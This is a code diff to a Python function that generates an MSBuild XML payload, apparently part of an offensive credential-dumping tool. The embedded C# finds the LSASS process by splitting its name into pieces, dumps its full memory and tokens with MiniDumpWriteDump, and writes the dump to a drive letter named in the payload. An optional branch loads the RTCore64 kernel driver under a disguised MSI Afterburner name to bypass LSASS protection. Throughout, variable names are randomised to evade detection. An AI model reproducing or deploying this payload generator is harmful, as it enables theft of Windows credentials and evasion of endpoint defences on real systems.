@@ -1273,13 +1273,31 @@ def gen_payload_regsvr32_mdwd(share_name, payload_name, addresses_array):
 def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array, runasppl):
     targetname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     taskname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithDataSegs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithFullMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithHandleData = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithThreadInfo = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithTokenInformation = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
+    filename = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     fs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    bRet = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    dumpTyp = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    prochandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    procid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    Dump = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     GetMyPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     myprocesses = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     myprocess = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     myid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    GetPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    processes = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    id = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     process = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     IsAdministrator = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
+    p = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    l = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    s = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    a = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     lines = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     RunAsPPLDll = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
@@ -1288,104 +1306,139 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
     i = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     thismachinesip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
 
-    xml_payload = '<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n'
-    xml_payload += '<!-- C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe SimpleTasks.csproj -->\n'
-    xml_payload += '	<Target Name="%s">\n' % (targetname)
-    xml_payload += '            <%s />\n' % (taskname)
-    xml_payload += '          </Target>\n'
-    xml_payload += '          <UsingTask\n'
-    xml_payload += '            TaskName="%s"\n' % (taskname)
-    xml_payload += '            TaskFactory="CodeTaskFactory"\n'
-    xml_payload += '            AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >\n'
-    xml_payload += '            <Task>\n'
+    xml_payload = "<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n"
+    xml_payload += "<!-- C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe SimpleTasks.csproj -->\n"
+    xml_payload += "	<Target Name=\"%s\">\n" % (targetname)
+    xml_payload += "            <%s />\n" % (taskname)
+    xml_payload += "          </Target>\n"
+    xml_payload += "          <UsingTask\n"
+    xml_payload += "            TaskName=\"%s\"\n" % (taskname)
+    xml_payload += "            TaskFactory=\"CodeTaskFactory\"\n"
+    xml_payload += "            AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" >\n"
+    xml_payload += "            <Task>\n"
 
-    xml_payload += '              <Code Type="Class" Language="cs">\n'
-    xml_payload += '              <![CDATA[\n'
-    xml_payload += 'using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities; using System.IO; using System.Linq; using System.Collections.Generic;\n'
-    xml_payload += 'public class %s : Task, ITask {\n' % (taskname)
+    xml_payload += "              <Code Type=\"Class\" Language=\"cs\">\n"
+    xml_payload += "              <![CDATA[\n"
+    xml_payload += "using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities; using System.IO; using System.Linq;\n"
+    xml_payload += "public class %s : Task, ITask {\n" % (taskname)
+    xml_payload += "		public enum Typ : uint\n"
+    xml_payload += "        {\n"
+    xml_payload += "            %s = 0x00000001,\n" % (MiniDumpWithDataSegs)
+    xml_payload += "            %s = 0x00000002,\n" % (MiniDumpWithFullMemory)
+    xml_payload += "            %s = 0x00000004,\n" % (MiniDumpWithHandleData)
+    xml_payload += "            %s = 0x00001000,\n" % (MiniDumpWithThreadInfo)
+    xml_payload += "            %s = 0x00040000,\n" % (MiniDumpWithTokenInformation)
+    xml_payload += "        };\n"
+    if runasppl:
+        xml_payload += "        [System.Runtime.InteropServices.DllImport(@\"%s:\\\\%s.dll\", EntryPoint = \"runninit\", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]\n" % (drive_letter, RunAsPPLDll)
+        xml_payload += "        static extern void runninit(string argus);\n"
 
-    xml_payload += '        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]\n'
-    xml_payload += '        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle OutFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);\n'
+    xml_payload += "        [System.Runtime.InteropServices.DllImport(\"dbghelp.dll\",\n"
+    xml_payload += "              EntryPoint = \"MiniDumpWriteDump\",\n"
+    xml_payload += "              CallingConvention = CallingConvention.StdCall,\n"
+    xml_payload += "              CharSet = CharSet.Unicode,\n"
+    xml_payload += "              ExactSpelling = true, SetLastError = true)]\n"
+    xml_payload += "        static extern bool MiniDumpWriteDump(\n"
+    xml_payload += "              IntPtr hProcess,\n"
+    xml_payload += "              uint processId,\n"
+    xml_payload += "              IntPtr hFile,\n"
+    xml_payload += "              uint dumpType,\n"
+    xml_payload += "              IntPtr expParam,\n"
+    xml_payload += "              IntPtr userStreamParam,\n"
+    xml_payload += "              IntPtr callbackParam);\n"
+
+    xml_payload += "        public static bool %s(string %s, Typ %s, IntPtr %s, uint %s)\n" % (Dump, filename, dumpTyp, prochandle, procid)
+    xml_payload += "        {\n"
+    xml_payload += "            using (var %s = new System.IO.FileStream(%s, System.IO.FileMode.Create, System.IO.FileAccess.Write, System.IO.FileShare.None))\n" % (fs, filename)
+    xml_payload += "            {\n"
+    xml_payload += "                bool %s = MiniDumpWriteDump(\n" % (bRet)
+    xml_payload += "                  %s,\n" % (prochandle)
+    xml_payload += "                  %s,\n" % (procid)
+    xml_payload += "                  %s.SafeFileHandle.DangerousGetHandle(),\n" % (fs)
+    xml_payload += "                  (uint)%s,\n" % (dumpTyp)
+    xml_payload += "                  IntPtr.Zero,\n"
+    xml_payload += "                  IntPtr.Zero,\n"
+    xml_payload += "                  IntPtr.Zero);\n"
+    xml_payload += "                if (!%s)\n" % (bRet)
+    xml_payload += "                {\n"
+    xml_payload += "                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n"
+    xml_payload += "                }\n"
+    xml_payload += "                return %s;\n" % (bRet)
+    xml_payload += "            }\n"
+    xml_payload += "        }\n"
 
     if runasppl:
-        xml_payload += '        [System.Runtime.InteropServices.DllImport(@"%s:\\\\%s.dll", EntryPoint = "runninit", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]\n' % (drive_letter, RunAsPPLDll)
-        xml_payload += '       static extern void runninit(string argus);\n'
-    xml_payload += '        public static bool %s()\n' % (IsAdministrator)
-    xml_payload += '        {\n'
-    xml_payload += '            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))\n'
-    xml_payload += '                      .IsInRole(WindowsBuiltInRole.Administrator);\n'
-    xml_payload += '        }\n'
+        xml_payload += "        public static int %s() {\n" % (GetMyPID)
+        xml_payload += "            var %s = System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ProcessName);\n" % (myprocesses)
+        xml_payload += "            var %s = 0;\n" % (myid)
+        xml_payload += "            foreach (var %s in %s)\n" % (myprocess, myprocesses)
+        xml_payload += "            {\n"
+        xml_payload += "                %s = %s.Id;\n" % (myid, myprocess)
+        xml_payload += "            }\n"
 
+        xml_payload += "            return %s;\n" % (myid)
+        xml_payload += "        }\n"
+
+    xml_payload += "        public static int %s() {\n" % (GetPID)
+    xml_payload += "            string %s = \"s\";\n" % (s)
+    xml_payload += "            string %s = \"l\";\n" % (l)
+    xml_payload += "            string %s = \"a\";\n" % (a)
+    xml_payload += "            var %s = System.Diagnostics.Process.GetProcessesByName(%s + %s + %s + %s + %s);\n" % (processes, l, s, a, s, s)
+    xml_payload += "            var %s = 0;\n" % (id)
+    xml_payload += "            foreach (var %s in %s)\n" % (process, processes)
+    xml_payload += "            {\n"
+    xml_payload += "                %s = %s.Id;\n" % (id, process)
+    xml_payload += "            }\n"
+
+    xml_payload += "            return %s;\n" % (id)
+    xml_payload += "        }\n"
+
+    xml_payload += "        public static bool %s()\n" % (IsAdministrator)
+    xml_payload += "        {\n"
+    xml_payload += "            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))\n"
+    xml_payload += "                      .IsInRole(WindowsBuiltInRole.Administrator);\n"
+    xml_payload += "        }\n"
+
+    xml_payload += "        public override bool Execute()\n"
+    xml_payload += "		{\n"
+    xml_payload += "            if (%s())\n" % (IsAdministrator)
+    xml_payload += "            {\n"
+    xml_payload += "                var %s = System.IO.File.ReadLines(\"%s:\\\\%s.txt\").ToArray();\n" % (lines, drive_letter, addresses_file)
+    xml_payload += "                string %s = \"\";\n" % (thismachinesip)
+    xml_payload += "                var %s = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());\n" % (ipEntry)
+    xml_payload += "                foreach (var %s in %s.AddressList)\n" % (ip, ipEntry)
+    xml_payload += "                {\n"
+    xml_payload += "                    for (int %s = 0; %s < %s.Length; %s++)\n" % (i, i, lines, i)
+    xml_payload += "                    {\n"
+    xml_payload += "                        if (%s.ToString() == %s[%s].ToString())\n" % (ip, lines, i)
+    xml_payload += "                        {\n"
+    xml_payload += "                            %s = \"-\" + %s.ToString();\n" % (thismachinesip, ip)
+    xml_payload += "                        }\n"
+    xml_payload += "                    }\n"
+    xml_payload += "                }\n"
     if runasppl:
-        xml_payload += '        public static int %s() {\n' % (GetMyPID)
-        xml_payload += '            var %s = System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ProcessName);\n' % (myprocesses)
-        xml_payload += '            var %s = 0;\n' % (myid)
-        xml_payload += '            foreach (var %s in %s)\n' % (myprocess, myprocesses)
-        xml_payload += '            {\n'
-        xml_payload += '                %s = %s.Id;\n' % (myid, myprocess)
-        xml_payload += '            }\n'
-        xml_payload += '            return %s;\n' % (myid)
-        xml_payload += '        }\n'
+        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"sc.exe create RTCore64 type=kernel start=auto binPath=%s:\\\\RTCore64.sys DisplayName=\\\"Micro - Star MSI Afterburner\\\"\").WaitForExit();\n" % (drive_letter)
+        xml_payload += "                Thread.Sleep(1000);\n"
+        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"net start RTCore64\").WaitForExit();\n"
+        xml_payload += "                Thread.Sleep(1000);\n"
+        xml_payload += "                runninit(%s().ToString());\n" % (GetMyPID)
+        xml_payload += "                Thread.Sleep(1000);\n"
 
-    xml_payload += '        public override bool Execute()\n'
-    xml_payload += '		{\n'
-
-    xml_payload += '            if (%s() == false)\n' % (IsAdministrator)
-    xml_payload += '            {\n'
-    xml_payload += '                Console.WriteLine("not runnin as admin");\n'
-    xml_payload += '                return true;\n'
-    xml_payload += '            }\n'
-
-    xml_payload += '                var %s = System.IO.File.ReadLines("%s:\\\\%s.txt").ToArray();\n' % (lines, drive_letter, addresses_file)
-    xml_payload += '                string %s = "";\n' % (thismachinesip)
-    xml_payload += '                var %s = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());\n' % (ipEntry)
-    xml_payload += '                foreach (var %s in %s.AddressList)\n' % (ip, ipEntry)
-    xml_payload += '                {\n'
-    xml_payload += '                    for (int %s = 0; %s < %s.Length; %s++)\n' % (i, i, lines, i)
-    xml_payload += '                    {\n'
-    xml_payload += '                        if (%s.ToString() == %s[%s].ToString())\n' % (ip, lines, i)
-    xml_payload += '                        {\n'
-    xml_payload += '                            %s = "-" + %s.ToString();\n' % (thismachinesip, ip)
-    xml_payload += '                        }\n'
-    xml_payload += '                    }\n'
-    xml_payload += '                }\n'
-
-    xml_payload += '            try\n'
-    xml_payload += '            {\n'
+    xml_payload += "                string filePath = \"%s:\\\\\" + System.Net.Dns.GetHostName() + %s + \".dmp\";\n" % (drive_letter, thismachinesip)
+    xml_payload += "                Process %s = Process.GetProcessById(%s());\n" % (p, GetPID)
+    xml_payload += "                %s(filePath, (Typ.%s | Typ.%s | Typ.%s | Typ.%s | Typ.%s), %s.Handle, (uint)%s.Id);\n" % (Dump, MiniDumpWithFullMemory, MiniDumpWithDataSegs, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, p, p)
     if runasppl:
-        xml_payload += '                Process.Start("cmd.exe", @"/c " + "sc.exe create RTCore64 type=kernel start=auto binPath=%s:\\\\RTCore64.sys DisplayName=\\"Micro - Star MSI Afterburner\\"").WaitForExit();\n' % (drive_letter)
-        xml_payload += '                Thread.Sleep(1000);\n'
-        xml_payload += '                Process.Start("cmd.exe", @"/c " + "net start RTCore64").WaitForExit();\n'
-        xml_payload += '                Thread.Sleep(1000);\n'
-        xml_payload += '                runninit(%s().ToString());\n' % (GetMyPID)
-        xml_payload += '                Thread.Sleep(1000);\n'
-    xml_payload += '                Process[] %s = Process.GetProcessesByName("l" + "sa" + "ss");\n' % (process)
-    xml_payload += '                using (FileStream %s = new FileStream("%s:\\\\" + System.Net.Dns.GetHostName() + %s +".dmp", FileMode.Create, FileAccess.ReadWrite, FileShare.Write))\n' % (fs, drive_letter, thismachinesip)
-    xml_payload += '                {\n'
-    xml_payload += '                    bool b = MiniDumpWriteDump(%s[0].Handle, (uint)%s[0].Id, %s.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);\n' % (process, process, fs)
-    xml_payload += '                    if (!b){\n'
-    xml_payload += '                        throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n'
-    xml_payload += '                    }\n'
-    xml_payload += '                }\n'
+        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"net stop RTCore64\").WaitForExit();\n"
+        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"sc.exe delete RTCore64\").WaitForExit();\n"
 
-    if runasppl:
-        xml_payload += '                Process.Start("cmd.exe", @"/c " + "net stop RTCore64").WaitForExit();\n'
-        xml_payload += '                Process.Start("cmd.exe", @"/c " + "sc.exe delete RTCore64").WaitForExit();\n'
-
-    xml_payload += '            }\n'
-    xml_payload += '            catch (Exception)\n'
-    xml_payload += '            {\n'
-    xml_payload += '                Console.WriteLine("Error happened");\n'
-    xml_payload += '                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n'
-    xml_payload += '            }\n'
-
-    xml_payload += '			return true;\n'
-    xml_payload += '        }}\n'
-    xml_payload += '                                ]]>\n'
-    xml_payload += '                        </Code>\n'
-    xml_payload += '                </Task>\n'
-    xml_payload += '        </UsingTask>\n'
-    xml_payload += '</Project>'
+    xml_payload += "            }\n"
+    xml_payload += "			return true;\n"
+    xml_payload += "        }}\n"
+    xml_payload += "                                ]]>\n"
+    xml_payload += "                        </Code>\n"
+    xml_payload += "                </Task>\n"
+    xml_payload += "        </UsingTask>\n"
+    xml_payload += "</Project>"
 
     with open('/var/tmp/{}/{}.xml'.format(share_name, payload_name), 'w') as f:
         f.write(xml_payload)
